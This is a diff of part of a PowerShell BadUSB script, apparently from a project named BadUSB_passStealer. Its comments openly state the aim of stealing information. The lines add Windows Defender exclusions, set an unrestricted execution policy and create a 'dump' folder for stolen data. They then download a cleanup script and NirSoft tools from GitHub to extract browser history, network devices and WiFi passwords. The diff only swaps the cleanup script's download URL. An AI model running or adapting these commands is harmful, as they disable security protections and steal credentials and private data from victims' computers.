@@ -9,7 +9,7 @@ Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in
 Add-MpPreference -ExclusionExtension ps1 -Force
 Set-ExecutionPolicy unrestricted -Force
 New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory #Create dump/ directory to put all informations that we'll steal in it
-Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
+Invoke-WebRequest https://raw.githubusercontent.com/idontknow-CC/gigido/main/fin_upload.ps1 -OutFile fin_upload.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
